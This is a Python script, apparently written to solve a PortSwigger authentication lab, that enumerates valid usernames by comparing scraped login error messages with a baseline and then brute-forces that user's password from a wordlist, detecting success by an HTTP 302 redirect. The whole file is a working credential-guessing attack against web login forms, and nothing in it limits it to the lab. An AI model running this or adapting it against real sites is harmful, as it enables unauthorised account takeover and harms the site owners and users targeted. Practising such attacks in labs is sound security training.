import requests
import argparse
import time
import sys
import re

""" Explanation:
This script performs a dictionary-based brute-force attack.
Since the server randomizes the overall response length to thwart basic 
analysis, this script uses Regular Expressions (Regex) to extract the exact 
error message from the HTML DOM and compares the text itself to find the anomaly
(e.g., a missing period in the error string).
"""

def load_wordlists(u_path, p_path):
    with open(u_path, "r") as f:
        usernames = f.read().splitlines()
    with open(p_path, "r") as f:
        passwords = f.read().splitlines()
    return usernames, passwords

# New function to extract ONLY the error message
def get_error_message(html_content):
    # We search for the text right inside PortSwigger's warning tag
    match = re.search(r'<p class="?is-warning"?>(.*?)</p>', html_content)
    if match:
        return match.group(1) # Returns only the error text (e.g., "Invalid username or password.")
    return None

def brute_force_login(url, usernames_file, passwords_file):
    usernames, passwords = load_wordlists(usernames_file, passwords_file)
    session = requests.Session()
    found_username = None
    start_time = time.time()

    # 1. ESTABLISH THE BASELINE ERROR
    fake_user = "user_does_not_exist_999"
    baseline_data = {"username": fake_user, "password": "dummy_password_123"}
    baseline_response = session.post(url, data=baseline_data)
    
    baseline_error = get_error_message(baseline_response.text)
    
    if not baseline_error:
        print("[!] Could not find the error message in the HTML. Verify the URL or page structure.")
        sys.exit(1)
        
    # --- Phase 1: USERNAME ENUMERATION ---
    print("[*] Starting username enumeration...")
    for user in usernames:
        print(f"[-] Testing username: {user}\033[K", end="\r")
        
        data = {"username": user, "password": "dummy_password_123"}
        response = session.post(url, data=data)
        
        current_error = get_error_message(response.text)

        # 2. COMPARE THE EXTRACTED TEXT AGAINST THE BASELINE
        if current_error != baseline_error:
            print(f"[+] Valid username identified: {user}\033[K")
            print(f"    -> Subtle difference found!")
            print(f"    -> Baseline error: '{baseline_error}'")
            print(f"    -> Current error : '{current_error}'")
            found_username = user
            break

    if not found_username:
        print("\n[!] No valid username found.")
        sys.exit(1)

    # --- Phase 2: PASSWORD BRUTE-FORCING ---
    print(f"\n[*] Starting password brute-force for user: {found_username}...")
    for pwd in passwords:
        print(f"[-] Testing password: {pwd}\033[K", end="\r")
        
        data = {"username": found_username, "password": pwd}
        response = session.post(url, data=data, allow_redirects=False)

        if response.status_code == 302:
            print(f"[!!!] PASSWORD FOUND: {pwd}\033[K")
            print(f"[✔] Time taken: {time.time() - start_time:.2f} seconds")
            return

    print("\n[!] Password not found in the provided list.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute-force script for PortSwigger Authentication Lab")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-U", "--usernames", required=True, help="Path to the usernames wordlist")
    parser.add_argument("-P", "--passwords", required=True, help="Path to the passwords wordlist")
    args = parser.parse_args()

    print(f"[*] Initializing attack on {args.url}...\n")
    brute_force_login(args.url, args.usernames, args.passwords)